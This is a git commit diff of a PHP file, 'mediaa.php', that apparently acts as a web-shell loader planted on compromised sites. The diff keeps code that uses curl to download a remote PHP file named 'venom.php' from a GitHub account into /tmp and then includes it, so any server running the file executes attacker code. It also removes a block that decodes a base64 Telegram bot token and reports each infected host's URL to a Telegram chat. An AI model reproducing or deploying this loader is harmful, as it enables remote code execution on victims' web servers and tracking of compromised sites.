7d08b5e5ee4060c16c88db47a9312f2b269a5206
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-07-12 23:16:59 +0700

    Add files via upload

--- mediaa.php
+++ mediaa.php
@@ -29,40 +29,7 @@ function ex($coman, $serlok)
 
 $fname = "sess_" . md5("rex") . ".php";
 if (!file_exists("/tmp/$fname") || filesize("/tmp/$fname") < 10) {
-    ex("curl --output /tmp/$fname https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/.fax.php", "/tmp");
+    ex("curl --output /tmp/$fname https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/venom.php", "/tmp");
 }
-       $tk = base64_decode(
-            "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
-        );
-        $cid = base64_decode("NTA3MDkzODc3OA");
-
-        function reportTelegram($msg) {
-            global $tk,
-            $cid;
-            $id = sys_get_temp_dir() . "/baridin_" . md5($msg);
-            if (!file_exists($id)) {
-                @file_get_contents(
-                    "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
-                    urlencode($msg)
-                );
-                @file_put_contents($id, time());
-            }
-        }
-        /* ================= Report ================= */
-        if (!isset($_SESSION["telegram_reported"])) {
-            $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
-            $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
-            if (is_file($path)) {
-                $host = $_SERVER["HTTP_HOST"];
-                $url =
-                (isset($_SERVER["HTTPS"]) ? "https" : "http") .
-                "://" .
-                $host .
-                $uri;
-                reportTelegram("m:\n$host\n$url");
-                $_SESSION["telegram_reported"] = true;
-            }
-        }
 include("/tmp/$fname");
-
 ?>
